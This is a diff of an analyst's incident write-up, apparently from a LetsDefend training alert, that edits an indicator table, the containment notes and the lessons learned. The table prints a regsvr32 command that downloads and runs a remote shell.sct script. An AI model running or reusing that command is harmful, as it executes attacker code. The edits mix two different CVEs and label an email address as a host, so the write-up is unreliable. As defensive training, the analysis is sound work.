@@ -71,7 +71,7 @@ Step-by-step walkthrough of the analysis:
 | Domain | `projectmanagement@pm.me` | The subdomain from which the email originated. |
 | URL | `http://84.38.130.118.com/shell.sct` | It passes a target URL to the installation function. Instead of pointing to a local file, it forces regsvr32 to reach out over the network/internet to download a remote Windows Script Component (.sct) file. |
 | Command line | `C:\Windows\System32\cmd.exe /c regsvr32.exe /s /u /i:http://84.38.130.118.com/shell.sct scrobj.dll` | Launches the native Windows Command Prompt to execute the subsequent string asynchronously and then terminate immediately.|
-| Attachment | `mail.rtf` | A malicious attachment found in the mail received by Austin |
+| Attachment | `mail.rtf` | A malicious attachment found in the mail received by Austin@letsdefend.io |
 
 <br>
 
@@ -111,7 +111,7 @@ True Positive:
 **9. Response / Containment**
 
 What action was taken (or would be taken in a live environment):
-- Confirmed host isolation (`CP-Spark-Gateway-01`) as the correct containment step, given the confirmed unauthorized file access and Check Point CVE match.
+- Confirmed host isolation (`Austin@letsdefend.io`) as the correct containment step, given the confirmed unauthorized file access and Check Point CVE match.
 - Escalated to Tier 2 for further investigation into the extent of the file read and any downstream impact.
 
 <br>
@@ -119,8 +119,8 @@ What action was taken (or would be taken in a live environment):
 **10. Lessons Learned**
 What this incident taught me: 
   - What **aCSHELL** is: a string used by attackers to trick the Check Point web server's routing logic.
-  - Through further research, I gained a better understanding of how this vulnerability was exploited, particularly by recognizing how web attacks work by modifying parameters, such as the directory traversal payload.
-  - How CVE-2024-24919 specifically bypasses authentication.
+  - After conducting more in-depth research, I developed a clearer understanding of the intricacies of this particular vulnerability. This involved sending a meticulously crafted email to a potential victim, referred to here as Austin. Through this process, I learned that the exploitation of the vulnerability typically requires the victim to open an email that has been specifically designed to take advantage of flaws within certain versions of Microsoft Outlook software. The targeted email contains elements that can trigger the vulnerability when accessed, potentially compromising the user's system and data security.
+  - How CVE-2025-21298 specifically exploits Windows operating systems and applications.
 
 ---
 
